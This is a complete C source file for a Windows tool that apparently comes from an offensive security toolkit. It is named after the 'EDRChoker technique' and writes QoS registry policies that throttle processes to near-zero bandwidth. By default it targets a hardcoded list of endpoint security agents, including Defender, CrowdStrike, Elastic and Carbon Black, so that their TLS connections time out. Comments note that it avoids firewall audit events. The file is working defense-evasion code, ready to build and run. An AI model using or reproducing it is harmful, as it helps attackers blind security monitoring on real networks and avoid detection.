/*
 * 04_qos_throttle.c
 * QoS Policy Throttling (EDRChoker technique)
 *
 * Creates Windows QoS policies via registry that instruct pacer.sys to
 * throttle target processes to near-zero bandwidth, causing TLS handshakes
 * to timeout before completing.
 *
 * Operates BELOW WFP — generates no WFP audit events (no Event 5447).
 *
 * Build:
 *   cl 04_qos_throttle.c /link Advapi32.lib rpcrt4.lib
 *
 * Usage:
 *   04_qos_throttle.exe install  [process1.exe] [process2.exe] ...
 *   04_qos_throttle.exe remove
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <rpc.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "rpcrt4.lib")

#define QOS_KEY_BASE   L"SOFTWARE\\Policies\\Microsoft\\Windows\\QoS"
#define THROTTLE_RATE  L"1"      /* ~8 bits/second effective — causes TLS timeout */
#define MARKER_VALUE   L"__edr_throttle__"  /* sentinel to identify our keys */

static const WCHAR *EDR_PROCESSES[] = {
    L"MsMpEng.exe",
    L"MsSense.exe",
    L"SenseCncProxy.exe",
    L"elastic-agent.exe",
    L"elastic-endpoint.exe",
    L"xagt.exe",
    L"CSFalconService.exe",
    L"CSFalconContainer.exe",
    L"cb.exe",
    L"cbdefense.exe",
    L"cylancesvc.exe",
    L"ds_agent.exe",
    L"QualysAgent.exe",
    NULL
};

/* Generate a GUID string for use as registry key name */
static BOOL GenGuidString(WCHAR *out, DWORD len)
{
    UUID uuid;
    if (UuidCreate(&uuid) != RPC_S_OK) return FALSE;

    WCHAR *str = NULL;
    if (UuidToStringW(&uuid, (RPC_WSTR *)&str) != RPC_S_OK) return FALSE;

    _snwprintf_s(out, len, _TRUNCATE, L"{%s}", str);
    RpcStringFreeW((RPC_WSTR *)&str);
    return TRUE;
}

/* Write a QoS registry key for the given process name */
static BOOL InstallQosPolicy(const WCHAR *processName)
{
    WCHAR guidStr[64] = {0};
    if (!GenGuidString(guidStr, ARRAYSIZE(guidStr))) return FALSE;

    WCHAR keyPath[512] = {0};
    _snwprintf_s(keyPath, ARRAYSIZE(keyPath), _TRUNCATE,
                 L"%s\\%s", QOS_KEY_BASE, guidStr);

    HKEY hKey = NULL;
    DWORD disposition = 0;
    LONG err = RegCreateKeyExW(
        HKEY_LOCAL_MACHINE,
        keyPath,
        0, NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE,
        NULL,
        &hKey,
        &disposition
    );

    if (err != ERROR_SUCCESS) {
        wprintf(L"  [-] RegCreateKeyExW failed: %ld\n", err);
        return FALSE;
    }

    /* Write all required QoS policy values */
    struct { const WCHAR *name; const WCHAR *value; } entries[] = {
        { L"Application Name",  processName   },  /* target process name */
        { L"Local IP",          L"*"          },
        { L"Local IP Prefix",   L"*"          },
        { L"Remote IP",         L"*"          },
        { L"Remote IP Prefix",  L"*"          },
        { L"Local Port",        L"*"          },
        { L"Remote Port",       L"*"          },
        { L"Protocol",          L"*"          },
        { L"Throttle Rate",     THROTTLE_RATE },  /* bps — near zero */
        { L"DSCP Value",        L"*"          },
        { L"Direction",         L"1"          },  /* 1 = outbound */
        { L"__marker",          MARKER_VALUE  },  /* sentinel for cleanup */
    };

    for (int i = 0; i < (int)(sizeof(entries)/sizeof(entries[0])); i++) {
        DWORD byteLen = (DWORD)((wcslen(entries[i].value) + 1) * sizeof(WCHAR));
        RegSetValueExW(hKey, entries[i].name, 0, REG_SZ,
                       (const BYTE *)entries[i].value, byteLen);
    }

    RegCloseKey(hKey);
    wprintf(L"  [+] QoS policy created: %s -> %s\n", processName, guidStr);
    return TRUE;
}

/* Remove all QoS keys we created (identified by our __marker sentinel) */
static void RemoveAllPolicies(void)
{
    HKEY hBase = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, QOS_KEY_BASE, 0,
                      KEY_READ | KEY_WRITE, &hBase) != ERROR_SUCCESS)
    {
        wprintf(L"[-] Cannot open QoS key (no policies installed?)\n");
        return;
    }

    WCHAR subName[64]  = {0};
    DWORD subLen       = ARRAYSIZE(subName);
    DWORD idx          = 0;
    UINT32 removed     = 0;

    /* Collect keys to delete (cannot delete while enumerating) */
    WCHAR toDelete[256][64];
    DWORD deleteCount = 0;

    while (RegEnumKeyExW(hBase, idx, subName, &subLen,
                         NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
    {
        /* Check for our sentinel value */
        HKEY hSub = NULL;
        if (RegOpenKeyExW(hBase, subName, 0, KEY_READ, &hSub) == ERROR_SUCCESS) {
            WCHAR marker[64] = {0};
            DWORD markerLen  = sizeof(marker);
            DWORD type       = 0;

            if (RegQueryValueExW(hSub, L"__marker", NULL, &type,
                                 (BYTE *)marker, &markerLen) == ERROR_SUCCESS &&
                wcscmp(marker, MARKER_VALUE) == 0)
            {
                wcscpy_s(toDelete[deleteCount], 64, subName);
                deleteCount++;
            }
            RegCloseKey(hSub);
        }

        idx++;
        subLen = ARRAYSIZE(subName);
    }

    /* Now delete collected keys */
    for (DWORD i = 0; i < deleteCount; i++) {
        if (RegDeleteKeyW(hBase, toDelete[i]) == ERROR_SUCCESS) {
            removed++;
            wprintf(L"  [+] Deleted: %s\n", toDelete[i]);
        }
    }

    RegCloseKey(hBase);
    wprintf(L"\n[+] Removed %u QoS policy/policies\n", removed);
}

static void InstallForProcess(const WCHAR *name)
{
    wprintf(L"[*] Installing QoS throttle for: %s\n", name);
    InstallQosPolicy(name);
}

int wmain(int argc, wchar_t *argv[])
{
    wprintf(L"[*] QoS Throttle Tool (EDRChoker technique)\n\n");

    if (argc < 2) {
        wprintf(L"Usage:\n");
        wprintf(L"  %s install                     (throttle all hardcoded EDR processes)\n", argv[0]);
        wprintf(L"  %s install proc1.exe proc2.exe (throttle specific processes)\n", argv[0]);
        wprintf(L"  %s remove                      (remove all throttle policies)\n", argv[0]);
        return 1;
    }

    if (_wcsicmp(argv[1], L"remove") == 0) {
        wprintf(L"[*] Removing all QoS throttle policies...\n");
        RemoveAllPolicies();
        return 0;
    }

    if (_wcsicmp(argv[1], L"install") == 0) {
        if (argc >= 3) {
            /* Specific processes given on command line */
            for (int i = 2; i < argc; i++) {
                InstallForProcess(argv[i]);
            }
        } else {
            /* Use hardcoded EDR list */
            for (int i = 0; EDR_PROCESSES[i] != NULL; i++) {
                InstallForProcess(EDR_PROCESSES[i]);
            }
        }

        wprintf(L"\n[*] QoS policies installed. Effect is immediate for new connections.\n");
        wprintf(L"[*] TLS handshakes will timeout after 2-5 seconds.\n");
        wprintf(L"[*] Run with 'remove' to clean up.\n");
        return 0;
    }

    wprintf(L"[-] Unknown command: %s\n", argv[1]);
    return 1;
}
